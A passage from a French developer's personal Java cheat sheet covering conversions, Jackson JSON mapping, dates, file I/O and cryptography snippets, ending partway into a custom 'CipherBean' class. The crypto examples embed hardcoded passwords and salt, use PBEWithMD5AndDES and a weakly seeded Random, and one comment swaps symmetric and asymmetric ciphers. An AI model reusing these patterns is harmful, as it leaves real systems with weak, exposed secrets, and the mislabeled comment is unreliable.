              	                    AudioSystem.write(appendedFiles, AudioFileFormat.Type.WAVE, temp);
              	                    File toDel1 = new File(nomFichier1);
              	                    toDel1.delete();
              	                    temp.renameTo(toDel1); voir LINKjgdlkqjfqdgmlk
              	                    log.debug(temp.getName()+" devient"+ toDel1.getName());	                    
              	                    seq.close();
              	    }
pour convertir un set en arraylist
      List<Criteria> mainList = new ArrayList<Criteria>();
              mainList.addAll(criteria);
              return mainList;
pour convertir un string en Time heure
    DateFormat formatter = new SimpleDateFormat("HH:mm"); // attention n'est pas threadsafe.
    java.sql.Time timeValue = new java.sql.Time(formatter.parse(fajr_prayertime).getTime());              	    
pour convertir une map en list
      List<Value> list = new ArrayList<Value>(map.values());
pour convertir un string en boolean:
    Boolean boolean1 = Boolean.valueOf("true");              	    
pour convertir un string en array json meme si l'array a plusieurs niveau :
                avec jackson avec controle du mapping
                classe ObjetclasseJava->Json
                           import com.fasterxml.jackson.annotation.JsonInclude;
                            import com.fasterxml.jackson.annotation.JsonInclude.Include;
                            @JsonInclude(Include.NON_DEFAULT) ne va par defaut renvoyer rien.. sur?
                            @JsonRootName("ds") // remplacer le nom de la racine userrecherche par ds
                            @JsonPropertyOrder({ "date", "sens" }) // pour qu'il renvoit les elements en respectant cet ordre
                            public class UserRecherche 
                            {
                            	private List<AutreClasse> matricules = new ArrayList<AutreClasse>();
                            	@JsonProperty(value = "matriculeutils") // personnaliser le nom json
                            	private List<AutreClasse> matricules = new ArrayList<AutreClasse>();
                            	@JsonProperty(value = "hour")
	                            @JsonFormat(shape=JsonFormat.Shape.STRING, pattern="HH:00", timezone="CET")
                            	private Date dateff = new Date();
                            	@JsonIgnore
                            	private String unChampNonMappe;
                            	getters...setters
                            }
                            voir pour les enums
                    Puis dans la classe main:
                    UserRecherche recherche = new UserRecherche();
                    ...remplir l'objet...
                      SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd"); // attention n'est pas threadsafe. 
                      String json = jsonMapper.writerWithDefaultPrettyPrinter().with(sdf).writeValueAsString(recherche); //rappel:Un Webservice Rest spring renvoit des objets java convertis en json, pas besoin de faire ca.
                convertir avec jackson String json -> Map JAVA sans controle du mapping
                              (<dependency> // pour utiliser direct les objets JSONArray etc...
                                  <groupId>com.fasterxml.jackson.datatype</groupId>
                                  <artifactId>jackson-datatype-json-org</artifactId>
                                  <version>2.9.4</version>
                              </dependency>
                                <dependency> // pour utiliser les anotations
                                <groupId>com.fasterxml.jackson.core</groupId>
                                <artifactId>jackson-databind</artifactId>
                                <version>2.9.4</version>
                            </dependency>)
                          ObjectMapper mapper = new ObjectMapper();
                          String json = "{\"name\":\"mkyong\", \"age\":29}";
                          Map<String, String> map = new HashMap<String, String>();
                          // convert JSON string to Map
                          map = mapper.readValue(json, new TypeReference<Map<String, String>>(){});
                          ou
                          map = mapper.readValue(json, new TypeReference<MaClasse>(){}); // attention besoin creer un constructeur vide dans MaClasse
                          ou 
                          MaClasse[] featureToComponentsLink = mapper.readValue(featuresFile, MaClasse[].class); // attention besoin creer un constructeur vide dans MaClasse
                          Object tti = map.get("age");
                          System.out.println(map);
                convertir avec jackson Objet->Stringjson: sans controle du mapping
                     ObjectMapper mapper = new ObjectMapper();
                      json = mapper.writeValueAsString(this);
                  jsonsring->Object Class Java 
                              //JSON from String to Object
                              Staff obj = mapper.readValue("objetoutablejson", Staff.class);
                              ObjectMapper mapper = new ObjectMapper();
                              String jsonInString = "{'name' : 'mkyong'}";
                              //JSON from file to Object
                              Staff obj = mapper.readValue(new File("c:\\file.json"), Staff.class);
                              //JSON from URL to Object
                              Staff obj = mapper.readValue(new URL("http://mkyong.com/api/staff.json"), Staff.class);
                              
              avec com.google.gwt.json
                  obj=JSONValue.parse(fileActSilJsonToComp); fileActSilJsonToComp ressemble à [[[sd;dsf]]]] par ex
                 	JSONArray fichiersNamesJsonToCompJson = (JSONArray)obj;
             	ou bien avec org.json : 
             	    JSONObject json = new JSONObject(lByteOut.toString());
             	    JSONArray json = new JSONArray(lByteOut.toString());
pour convertir une LinkedHashMap en array Json correctement :
                public JSONArray hMapToJson(LinkedHashMap<Integer, Object> var) throws Exception {
                		System.out.println(var.toString());
                		JSONArray ret = new JSONArray();
                		Set keys = var.keySet();
                		Iterator<Integer> it=keys.iterator();
                		while(it.hasNext())
                		{
                			Object key =it.next();
                			Object val = var.get(key);
                			if (val instanceof LinkedHashMap)
                			{
                				ret = fillJSonUntil(ret,(Integer)key);
                				ret.set((Integer)key,hMapToJson((LinkedHashMap<Integer, Object>)val));
                			}
                			else if(key instanceof Double)
                			{
                				ret = fillJSonUntil(ret,Integer.parseInt(Long.toString(Math.round((Double)key)))); // pour arrondir un double
                				ret.set(Integer.parseInt(Long.toString(Math.round((Double)key))), val.toString());
                			}
                			else
                			{
                				ret = fillJSonUntil(ret,(Integer)key);
                				ret.set((Integer)key,val);
                			}
                		}
                		return ret;
                	}
                	private JSONArray fillJSonUntil(JSONArray ret, Integer key) throws Exception {
                			for (int i=0; i<=key.intValue(); i++)
                			{
                				try
                				{
                					ret.get(i);
                				}
                				catch(IndexOutOfBoundsException e)
                				{
                					ret.add(i,null);
                				}
                			}
                		return ret;
                	}
ajouter des minutes à une heure 
        public String calculateArriveTime(String s, String is) throws ParseException {
                int i= Integer.parseInt(is);
                GregorianCalendar gc1 = new GregorianCalendar();
                SimpleDateFormat timeformatter = new SimpleDateFormat("HH:mm"); // attention n'est pas threadsafe.
                SimpleDateFormat minuteformatter = new SimpleDateFormat("mm");
                SimpleDateFormat dateformatter = new SimpleDateFormat("dd/MM/yyyy");
                long minutesToRemove=new Long(0);
                long minutesToAdd=new Long(0);
                Date debutdate= timeformatter.parse(s);
                long minisec = debutdate.getTime() + i * 60 * 1000;
                Date arrive = new Date(minisec);
                String ret = timeformatter.format(arrive);
                return ret;
            }


Remplacement de chaine1 (toutes les occurrences de chaine1) ,par chaine2
  il ya normalement replaceall mais si vieille version java <1.4: 
          public static String replaceAll(String target, String from, String to) {   
          //   target is the original string
          //   from   is the string to be replaced
          //   to     is the string which will used to replace
          //  returns a new String!
          int start = target.indexOf(from);
          if (start == -1) return target;
          int lf = from.length();
          char [] targetChars = target.toCharArray();
          StringBuffer buffer = new StringBuffer();
          int copyFrom = 0;
          while (start != -1) {
            buffer.append (targetChars, copyFrom, start - copyFrom);
            buffer.append (to);
            copyFrom = start + lf;
            start = target.indexOf (from, copyFrom);
            }
          buffer.append (targetChars, copyFrom, targetChars.length - copyFrom);
          return buffer.toString();
        }

  modulo : pour savoir si un nombre est entier reste de la division est vide, si c'est un multiple de... (utilisation de pourcentage)  
      return (nbTask % critNbTask) == 0
      Cela renvoie true si nbTask est un multiple de critNbTask et false dans le cas contraire.
      unGrandChiffre % 4 : ca divise unGrandChiffre (par ex 101) par 4 =25.25; 25*4 =100 et il reste 1 donc resultat = 1.
      si slkj%2==0 alors le nombre slkj est paire.
      pratique pour faire des boucles!!!!
      while ()
      {
        currentFrame = ++ currentFrame %4 // sera = 0; 1; 2; 3; 0; 1 etc...
      } 
       
  loop :
    DO WHILE  bien pratique: attention dowhile et while c'est pas tout a fait pareil: dowhile do while va d'abord executer ce qu'il y a dans le do au moins une fois 
						do
						{
							calendar.add(GregorianCalendar.DAY_OF_MONTH, 1);
							
						} while ( (calendar.get(GregorianCalendar.DAY_OF_WEEK) == GregorianCalendar.SATURDAY )|| ( calendar.get(GregorianCalendar.DAY_OF_WEEK) == GregorianCalendar.SUNDAY) );
les visibilites :
      Modifier              | Class | Package | Subclass | World
      public                |  Y    |    Y    |    Y     |   Y
      protected             |  Y    |    Y    |    Y     |   N
      no modifier (default) |  Y    |    Y    |    N     |   N
      private               |  Y    |    N    |    N     |   N
pour recuperer les bytes d'un fichier :
      	public byte[] getBytesFromFile(String string) throws Exception {
      	byte[] bytes = new byte[1024];
    		ByteArrayOutputStream lByteOut = new ByteArrayOutputStream();
    		File file = new File (string);
    		FileInputStream lire = new FileInputStream(file);
    		int count;
    		while((count = lire.read()) != -1) 
    		{
    			lByteOut.write(count);
    		}
    		lire.close(); 
    
    		return lByteOut.toByteArray();
    	}
    	ou plutot: 
    	while((i=lire.read(bytes, 0, bytes.length))>-1) {
				lByteOut.write(bytes, 0, i);
			}
			lire.close();
pour recuperer le string d'un fichier lire un fichier
        public String getStringFromFile(File file) throws Exception
        	{
        		ByteArrayOutputStream  lByteOut = new ByteArrayOutputStream();
        		byte[] bytes = new byte[1024];
        		FileInputStream lire = new FileInputStream(file); // fichier est un File
        		BufferedInputStream reader = new BufferedInputStream(lire);
        		int i;
        		while((i=lire.read(bytes, 0, bytes.length))>-1) {
        			lByteOut.write(bytes, 0, i);
        		}
        		lire.close();
        		reader.close(); 
        	return lByteOut.toString();
        	}
pour compter le nombre de caractères dans un fichier :
                        public int getNbCharFromFile(File file) throws Exception
                            	{
                                	int nb=0;
                            		ByteArrayOutputStream  lByteOut = new ByteArrayOutputStream();
                            		byte[] bytes = new byte[1024];
                            		FileInputStream lire = new FileInputStream(file); // fichier est un File
                            		BufferedInputStream reader = new BufferedInputStream(lire);
                            		int i;
                            		while((i=lire.read(bytes, 0, bytes.length))>-1) {
                            			
                            			lByteOut.write(bytes, 0, i);
                            			nb = nb+ lByteOut.toString().length();
                            			lByteOut = new ByteArrayOutputStream();
                            		}
                            		lire.close();
                            		reader.close(); 
                            	return nb;
                            	}        	
inputstream et ouputstream :
      input LIT dans un truc: on l'ecoute. output ECRIT dans un truc. on ecrit dedans.
Convertir un outputstream en inputstream : 
    ByteArrayInputStream toto  = new ByteArrayInputStream(byteOutputStream.toByteArray());      
la commande for avec un cas de figure plus "riche" :
          for (Enumeration<String> enumCertificates = keyStore.aliases(); enumCertificates.hasMoreElements();)
          {... }
          C'est exactement comme for (int i=8; i<9;i++) finallement sauf que le dernier argument n'est pas necessaire puisque ca s'incremente tout seul
pour ajouter/supprimer des jours à une date 
  autant utiliser timemillisecondes et faire le calcul soi-meme 
        long toto = datenow.getTime()-(7*24*60*60*1000); // 7 jours avant
        Date date1 = new Date(toto);
        Sinon on peut aussi utiliser gregorianCalendar
connaitre le nombre de mois entre deux dates : (diff dates)
// attention il faut que date1 soit < à date2
              public static int nbOfMonthsBetweenTwoDates(String dateString1, String dateString2) throws Exception  {
                      SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy"); // attention n'est pas threadsafe.
                      Date date1 = sdf.parse(dateString1);
                      GregorianCalendar gc1 = new GregorianCalendar();
                      gc1.setTime(date1);
                      Date date2 = sdf.parse(dateString2);
                      GregorianCalendar gc2 = new GregorianCalendar();
                      gc2.setTime(date2);
                      int gap = 0;
                      gc1.add(GregorianCalendar.MONTH, 1);
                      while(gc1.compareTo(gc2)<=0) {
                          gap++;
                          gc1.add(GregorianCalendar.MONTH, 1);
                      }
                      return gap;
                  }
pour recuperer la date la plus elevee ou la plus basse parmis une liste de dates :
                                   public static Date getLastDate(String... dates) throws ParseException {
                                      List<Date> dateslist = new ArrayList<Date>();
                                      SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy"); // attention n'est pas threadsafe.
                                      for (int i = 0; i<dates.length; i++)
                                      {
                                           Date after = null;
                                           try
                                           {
                                                   after = formatter.parse(dates[i]);
                                           }
                                           catch (Exception e)
                                           {
                                                   after=null;
                                           }
                                           dateslist.add(after);
                                      }
                                      Date biggest = formatter.parse("01/01/2001");
                                  
                                              for (int i = 0 ; i < dateslist.size() ; i ++) {
                                                      if(biggest.before(dateslist.get(i))) {
                                                              biggest=dateslist.get(i);
                                                      }
                                              }
                                      return biggest; // attention c'est une date qui est retournee
                                  }

Pour recuperer le user utilisateur connecte à travers un certificat
        Object certChain = request.getAttribute("javax.servlet.request.X509Certificate");
               if (certChain != null) {
                  X509Certificate certs[] = (X509Certificate[])certChain;
                  X509Certificate cert = certs[0];
                  String n = cert.getSubjectDN().getName();
                }

  Pour recuperer une cle d'un certificat : 
            	byte[] key = cipher.getCurrentSecretKey(CipherBean.getX509Certificate(certificateFile.getAbsolutePath())).getBytes();
  pour verifier une signature : En utilisant le cipherbean cypherbean de Francois : ou bien com.hraccess.services.crypto.JceSecretCipher
                //	verify the signature with the ASG certificate
                Certificate certificateASP = CipherBean.getX509Certificate(certificateFolder.getAbsolutePath()+ File.separator + aspZipFile.getCertificate());
            
								signatureOk ou decipherOk = CipherBean.verify(new FileInputStream(permRecvFolder+File.separator+cryptFileName), new FileInputStream(permRecvFolder+File.separator+sha1FileName), certificateASP ou certificatPublASG);
                catch (Exception e){
                      			log.error(e,e);
                      			signatureOk=false;
                      		}
  pour signer
             Ce qu'il fait en fait c'est ça : (JeanMichelSoulat)
						token.append(Base64.encodeBase64URLSafeString(UnStringAEncrypter.getBytes("UTF-8")));
//   Load the private key from a keystore
            KeyStore keystore = KeyStore.getInstance("JKS"); ou "PKCS12"
            keystore.load( new FileInputStream( certFilePath), MotDePasseAccesCertif.toCharArray());
            PrivateKey privateKey = (PrivateKey) keystore.getKey("awcsb01alias", "awcsb01".toCharArray());
            //On va signer avec la cle privee 
            java.security.Signature signer = java.security.Signature.getInstance("SHA256withRSA" ou "SHA1withRSA"); // les cles les plus longues : conseille d'utiliser celles-ci
            signer.initSign(privateKey);
            signer.update(unString.getBytes("UTF-8"));
            String signedPayload = org.apache.commons.codec.binary.Base64.encodeBase64URLSafeString(signer.sign());
            signedPayload est la signature!
				deuxième methode pour signer un string:
            Mac sha512_HMAC;
           	byte[] secretkeyBytes = Base64.decodeBase64(secretKey); // secreatKey est un string
          	try {
          	  sha512_HMAC = Mac.getInstance("HmacSHA512");      
          	  SecretKeySpec secretkey = new SecretKeySpec(secretkeyBytes, "HmacSHA512");
          	  sha512_HMAC.init(secretkey);
          	  byte[] mac_data = sha512_HMAC.doFinal(stringToSign.getBytes("UTF-8"));        
          	  result = org.apache.commons.codec.binary.Base64.encodeBase64String(mac_data);
    pour crypter cripter decripter decrypter des donnees en java
                  public void crypterDecrypter() throws NoSuchPaddingException, NoSuchAlgorithmException, IOException, UnrecoverableKeyException, KeyStoreException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException, CertificateException {
                      //d'abord crypter
                     //KeyStore keystore = KeyStore.getInstance("PKCS12");
                      KeyStore keystore = KeyStore.getInstance("JKS");
                      String cle = "samlKeystore.jks";
                      //String cle = "speig2.p12";
                      String password = "speighrasso2018";//"speig1234";
                      //String password = "speig1234";
                      String alias = "speig";
                      //String alias = "speig2";
                      keystore.load( new FileInputStream( URLDecoder.decode(ClassLoader.getSystemResource(cle).getPath(),"UTF-8")), password.toCharArray());
                      Key publicKey = keystore.getCertificate(alias).getPublicKey(); // recuperer la cle publique
                      Cipher cipher = Cipher.getInstance("RSA");
                      cipher.init(Cipher.ENCRYPT_MODE, publicKey);
                      byte[] res = cipher.doFinal("sssssssssssssdfsfsdfsdfblalabla".getBytes());
                      System.out.println(new String(res));
                      // maintenant decrypter :
                      Key privateKey = keystore.getKey(alias, password.toCharArray()); // recuperer la cle privee
                      cipher.init(Cipher.DECRYPT_MODE, privateKey);
                      byte[] ret = cipher.doFinal(res);
                      System.out.println(new String(ret));
                  }
        
        
                  			
			pour recuperer un certificat:
			         Certificate certificateSYE = CipherBean.getX509Certificate(syeCertificateName.getAbsolutePath());
  si la methode cipher.cipher(new FileInputStream(filesToSend), new FileOutputStream(dataCrypt)); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
              ne marche pas, aller dans C:\Program Files\IBM\SDP70\runtimes\base_v61\java\jre\lib\security
              Il faut que local_policy.jar contienne la meme chose que ce qu'il y a dans US_export_policy.jar. le JCE contenant les deux jar est à mettre sous jre.x.x.x/ (voir README)
                      pour cripter decripter de gros fichiers :
              				 //-----------------Cipher (c'est un criptage super car on cripte de gros fichiers avec une cle symetrique RSA. Cette cle est ensuite criptee par une cle publiqueAsymetrique DES)
              				 CipherBean cipher = CipherFactory.getCipherBean(CipherFactory.CIPHER_TYPE.DESede);
              				FileInputStream fileTest = new FileInputStream(tmpRecvFolder+File.separator+"texte.txt");//chemin absolu necessaire
              				FileOutputStream criptedFileTest = new FileOutputStream(tmpRecvFolder+File.separator+"texteCRIPTE.txt"); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
              				cipher.cipher(fileTest, criptedFileTest);
              				// write SecretKey
              				Certificate alias = CipherBean.getX509Certificate("D:/workspaceRAD7PRojectsSVN/syeBatch/conf/test/awsye01.pem");
              				String keyString =cipher.getCurrentSecretKey(alias); 
              					FileOutputStream ft = new FileOutputStream(new File("D:/workspaceRAD7PRojectsSVN/syeBatch/conf/test/macke.key")); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
              					ft.write(keyString.getBytes());
              					ft.close();
              					byte[]keyByte = getBytesFromFile("D:/workspaceRAD7PRojectsSVN/syeBatch/conf/test/macke.key");
              				// ---------------decipher
              				cipher = CipherFactory.getCipherBeanFromSecretKey(new String(keyByte)ou keyString,CipherFactory.CIPHER_TYPE.DESede, "D:/workspaceRAD7PRojectsSVN/syeBatch/conf/test/awsye01.p12", "awsye01");
              				FileOutputStream decipheredFileTest = new FileOutputStream(tmpRecvFolder+File.separator+"texteREDECRIPTE.txt"); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
              				cipher.decipher(new FileInputStream(new File(tmpRecvFolder+File.separator+"texteCRIPTE.txt")), decipheredFileTest); 
              			pour cripter-decripter un mot de passe avec une cle symetrique:
              			         package com.soprahr.edsn.usermanager.defaultimpl;
                              import java.io.IOException;
                              import java.security.GeneralSecurityException;
                              import javax.crypto.Cipher;
                              import javax.crypto.SecretKeyFactory;                      
                              import javax.crypto.spec.PBEKeySpec;
                              import javax.crypto.spec.PBEParameterSpec;
                              import org.apache.commons.codec.binary.Base64;
                              public class PasswordManager {
                              	public PasswordManager() {
                              	}
                              	public static String encrypt(String property) throws GeneralSecurityException {
                              		SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBEWithMD5AndDES"); //PBEWithMD5AndDES est vulnérable 
                              		javax.crypto.SecretKey key = keyFactory.generateSecret(new PBEKeySpec(PASSWORD));
                              		Cipher pbeCipher = Cipher.getInstance("PBEWithMD5AndDES");    //PBEWithMD5AndDES est vulnérable
                              		pbeCipher.init(1, key, new PBEParameterSpec(SALT, 20));
                              		return base64Encode(pbeCipher.doFinal(property.getBytes()));
                              	}
                              	private static String base64Encode(byte bytes[]) {
                              		return new String(Base64.encodeBase64(bytes));
                              	}
                              	public static String decrypt(String property)	throws GeneralSecurityException, IOException {
                              		SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBEWithMD5AndDES");   //PBEWithMD5AndDES est vulnérable
                              		javax.crypto.SecretKey key = keyFactory.generateSecret(new PBEKeySpec(PASSWORD));
                              		Cipher pbeCipher = Cipher.getInstance("PBEWithMD5AndDES"); //PBEWithMD5AndDES est vulnérable
                              		pbeCipher.init(2, key, new PBEParameterSpec(SALT, 20));
                              		return new String(pbeCipher.doFinal(base64Decode(property)));
                              	}
                              	private static byte[] base64Decode(String property) throws IOException {
                              		return Base64.decodeBase64(property.getBytes());
                              	}
                              	private static final char PASSWORD[] = "Accenture1".toCharArray();
                              	private static final byte SALT[] = { -34, 51, 16, 18, -34, 51, 16, 18 };
                              }

Cipherbean cypherbean de francois :
                                                                        package minute.util.cipher;
                                                                        
                                                                        import java.io.BufferedInputStream;
                                                                        import java.io.ByteArrayOutputStream;
                                                                        import java.io.File;
                                                                        import java.io.FileInputStream;
                                                                        import java.io.FileNotFoundException;
                                                                        import java.io.FileOutputStream;
                                                                        import java.io.IOException;
                                                                        import java.io.InputStream;
                                                                        import java.io.OutputStream;
                                                                        import java.io.UnsupportedEncodingException;
                                                                        import java.util.ArrayList;
                                                                        import java.util.Calendar;
                                                                        import java.util.Enumeration;
                                                                        import java.util.HashMap;
                                                                        import java.util.List;
                                                                        import java.util.Map;
                                                                        import java.util.Random;
                                                                        
                                                                        import javax.crypto.BadPaddingException;
                                                                        import javax.crypto.Cipher;
                                                                        import javax.crypto.CipherOutputStream;
                                                                        import javax.crypto.IllegalBlockSizeException;
                                                                        import javax.crypto.NoSuchPaddingException;
                                                                        import javax.crypto.SecretKey;
                                                                        import javax.crypto.spec.IvParameterSpec;
                                                                        
                                                                        import java.security.InvalidAlgorithmParameterException;
                                                                        import java.security.InvalidKeyException;
                                                                        import java.security.Key;
                                                                        import java.security.MessageDigest;
                                                                        import java.security.NoSuchAlgorithmException;
                                                                        import java.security.PrivateKey;
                                                                        import java.security.Provider;
                                                                        import java.security.PublicKey;
                                                                        import java.security.Security;
                                                                        import java.security.Signature;
                                                                        import java.security.KeyStoreException;
                                                                        import java.security.KeyPair;
                                                                        import java.security.KeyPairGenerator;
                                                                        import java.security.KeyStore;
                                                                        import java.security.SignatureException;
                                                                        import java.security.UnrecoverableKeyException;
                                                                        import java.security.cert.Certificate;
                                                                        import java.security.cert.CertificateException;
                                                                        import java.security.cert.CertificateFactory;
                                                                        import java.security.cert.X509Certificate;
                                                                        
                                                                        import org.apache.log4j.Logger;
                                                                        import org.apache.log4j.Priority;
                                                                        import org.apache.commons.codec.binary.Base64;
                                                                        
                                                                        // TODO: Auto-generated Javadoc
                                                                        //import sun.misc.BASE64Decoder; Ne pas utiliser ca! utiliser java.util.Base64 a la place
                                                                        //import sun.misc.BASE64Encoder; Ne pas utiliser ca!
                                                                        
                                                                        /**
                                                                         * CrgCipher : A limited cipher to fullfill cryptographic needs of project use a
                                                                         * pk12 keystore use keys RSA 2048 bits and AES 256 bits.
                                                                         * 
                                                                         * @author RS3MINUTE
                                                                         * @version 1.0 5 Août 2009
                                                                         */
                                                                        public final class CipherBean {
                                                                        
                                                                        	/**
                                                                        	 * The Class CipherException.
                                                                        	 */
                                                                        	public static class CipherException extends Exception {
                                                                        
                                                                        		/** The Constant serialVersionUID. */
                                                                        		private static final long serialVersionUID = 1L;
                                                                        
                                                                        		/**
                                                                        		 * Instantiates a new cipher exception.
                                                                        		 * 
                                                                        		 * @param string
                                                                        		 *            the string
                                                                        		 */
                                                                        		public CipherException(String string) {
                                                                        			// TODO Auto-generated constructor stub
                                                                        			super(string);
                                                                        		}
                                                                        
                                                                        		/**
                                                                        		 * Instantiates a new cipher exception.
                                                                        		 * 
                                                                        		 * @param t
                                                                        		 *            the t
                                                                        		 */
                                                                        		public CipherException(Throwable t) {
                                                                        			// TODO Auto-generated constructor stub
                                                                        			super(t);
                                                                        		}
                                                                        	}
                                                                        
                                                                        	// Initialization Vector
                                                                        	// Required for CBC
                                                                        	private byte[] iv = null;
                                                                        		
                                                                        	public byte[] getIv() {
                                                                        		return iv;
                                                                        	}
                                                                        
                                                                        	public void setIv(byte[] iv) {
                                                                        		this.iv = iv;
                                                                        	}
                                                                        	/** The log. */
                                                                        	private static Logger log = Logger.getLogger(CipherBean.class);
                                                                        
                                                                        	/** The key store path. */
                                                                        	private static transient String keyStorePath = null; // transient : ce champ n'est pas serializable serialisable.
                                                                        
                                                                        	/** The key store psw. */
                                                                        	private static transient String keyStorePsw = null;
                                                                        
                                                                        	/** The random. */         voir aussi uuid
                                                                          	private static transient Random random = new Random(Runtime.getRuntime().freeMemory());
                                                                        
                                                                        	/** The keystore object. */
                                                                        	private static transient KeyStore ks = null;
                                                                        
                                                                        	/** The ks type. */
                                                                        	private static transient String ksType = "JCEKS";
                                                                        
                                                                        	/** The Constant RSA. */
                                                                        	public static final int RSA = 0;
                                                                        
                                                                        	/** The Constant DES. */
                                                                        	public static final int DES = 1;
                                                                        
                                                                        	/** The Constant AES. */
                                                                        	public static final int AES = 3;
                                                                        
                                                                        	/** The Constant CERT. */
                                                                        	public static final int CERT = 4;
                                                                        
                                                                        	/** The Constant SIGN. */
                                                                        	public static final int SIGN = 5;
                                                                        
                                                                        	/** The Constant B64. */
                                                                        	public static final String B64 = "B64";
                                                                        	/** The Constant B64Chunked. */
                                                                        	public static final String B64C = "B64C";
                                                                        	/** The Constant HEX. */
                                                                        	public static final String HEX = "HEX";
                                                                        	/** The Constant HEXSigned. */
                                                                        	public static final String HES = "HES";
                                                                        
                                                                        	/** The Constant RSA_ALK. */
                                                                        	public static final String RSA_ALK = "RSA";
                                                                        	
                                                                        	/** The Constant AES_ALK. */
                                                                        	public static final String AES_ALK = "AES";
                                                                        	
                                                                        	/** The Constant DES_ALK. */
                                                                        	public static final String DES_ALK = "DESede";
                                                                        
                                                                        	/** The Constant RSA_ALGO. */
                                                                        	private static final String RSA_ALGO = "RSA/ECB/PKCS1Padding"; // "RSAwithNoPad";
                                                                        
                                                                        	/** The Constant RSA_LENGTH. */
                                                                        	private static final int RSA_LENGTH = 2048;
                                                                        
                                                                        	/** The Constant AES_LENGTH. */
                                                                        	private static final int AES_LENGTH = 256;
                                                                        
                                                                        	/** The Constant AES_ALK. */
                                                                        	public static final String DES_ALGO = "DESede/CBC/PKCS5Padding";
                                                                        
                                                                        	/** The Constant AES_LENGTH. */
                                                                        	private static final int DES_LENGTH = 168;
                                                                        
                                                                        	/** The Constant AES_ALGO. */
                                                                        	public static final String AES_ALGO = "AES/CBC/PKCS5Padding";
                                                                        
                                                                        	/** The Constant SIGN_ALGO1. */
                                                                        	private static final String SIGN_ALGO1 = "SHA1withRSA";
                                                                        
                                                                        	/** The signature. */
                                                                        	private static transient Signature signature;
                                                                        
                                                                        	/** The Constant SIGN_ALGO2. */
                                                                        	@SuppressWarnings("unused")
                                                                        	private static final String SIGN_ALGO2 = "SHA1withDSA";
                                                                        
                                                                        	/**
                                                                        	 * The sun BASE64Encoder to encode ciphered bytes.
                                                                        	 * 
                                                                        	 * @param bytes
                                                                        	 *            the bytes
                                                                        	 * @return the string
                                                                        	 */
                                                                        	// private static BASE64Encoder bb64e = new BASE64Encoder();
                                                                        
                                                                        	/** The sun BASE64Decoder to decode ciphered bytes. */
                                                                        	// private static BASE64Decoder bb64d = new BASE64Decoder();
                                                                        
                                                                        	/**
                                                                        	 * Binary to hex.
                                                                        	 * 
                                                                        	 * Encode ciphered bytes into hex representation
                                                                        	 * 
                                                                        	 * @param bytes
                                                                        	 *            the bytes
                                                                        	 * 
                                                                        	 * @return the string
                                                                        	 * 
                                                                        	 * @throws Exception
                                                                        	 *             the exception
                                                                        	 */
                                                                        	private static String binaryToHex(byte[] bytes) {
                                                                        		StringBuffer returnValue = new StringBuffer();
                                                                        		int y = 0;
                                                                        		final int octetSize = 8;
                                                                        		final int base16 = 16;
                                                                        		for (byte b : bytes) {
                                                                        			y = 0;
                                                                        			for (int i = 0; i < octetSize; i++) {
                                                                        				if (((b >>> i) & 1) == 1) {
                                                                        					y += Math.pow(2, i); // c'est pas exposant c'est puissance: 2puissance i
                                                                        				}
                                                                        			}
                                                                        			returnValue.append((y<16?"0":"")+Integer.toString(y, base16));
                                                                        		}
                                                                        		return returnValue.toString().toUpperCase();
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Binary to hex.
                                                                        	 * 
                                                                        	 * Encode ciphered bytes into signed hex representation
                                                                        	 * 
                                                                        	 * @param bytes
                                                                        	 *            the bytes
                                                                        	 * @return the string
                                                                        	 */
                                                                        	private static String binaryToSignedHex(byte[] bytes) {
                                                                        		StringBuffer returnValue = new StringBuffer();
                                                                        		final int base16 = 16;
                                                                        		for (int i = 0; i < bytes.length; i++) {
                                                                        			returnValue.append(Integer.toString(bytes[i], base16)
                                                                        					+ (i < bytes.length - 1 ? " " : ""));
                                                                        		}
                                                                        		return returnValue.toString().toUpperCase();
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * From base64.
                                                                        	 * 
                                                                        	 * @param bytes
                                                                        	 *            the bytes
                                                                        	 * @return the byte[]
                                                                        	 * @throws IOException
                                                                        	 *             Signals that an I/O exception has occurred.
                                                                        	 */
                                                                        	private static byte[] fromBase64(String bytes) throws IOException {
                                                                        		// return bb64d.decodeBuffer(bytes);
                                                                        		return Base64.decodeBase64(bytes.getBytes());
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the aliases.
                                                                        	 * 
                                                                        	 * @return the aliases
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 * @throws CertificateException
                                                                        	 *             the certificate exception
                                                                        	 * @throws CipherException
                                                                        	 *             the cipher exception
                                                                        	 * @throws IOException
                                                                        	 *             Signals that an I/O exception has occurred.
                                                                        	 */
                                                                        	public final static Map<Integer, String> getAliases()
                                                                        			throws NoSuchAlgorithmException, CertificateException,
                                                                        			CipherException, IOException {
                                                                        		return getAliases(ks);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the aliases.
                                                                        	 * 
                                                                        	 * @param keyStore
                                                                        	 *            the key store
                                                                        	 * @return the aliases
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 * @throws CertificateException
                                                                        	 *             the certificate exception
                                                                        	 * @throws CipherException
                                                                        	 *             the cipher exception
                                                                        	 * @throws IOException
                                                                        	 *             Signals that an I/O exception has occurred.
                                                                        	 */
                                                                        	public static Map<Integer, String> getAliases(KeyStore keyStore)
                                                                        			throws NoSuchAlgorithmException, CertificateException,
                                                                        			CipherException, IOException {
                                                                        		Map<Integer, String> listCertificates = new HashMap<Integer, String>();
                                                                        		Enumeration<String> enumCertificates = null;
                                                                        		try {
                                                                        			int i = 0;
                                                                        			CipherBean.init();
                                                                        			enumCertificates = keyStore.aliases();
                                                                        			while (enumCertificates.hasMoreElements()) {
                                                                        				listCertificates.put(i, enumCertificates.nextElement());
                                                                        				i++;
                                                                        			}
                                                                        		} catch (KeyStoreException kex) {
                                                                        			kex.getMessage();
                                                                        		}
                                                                        		return listCertificates;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the bytes from encoded string.
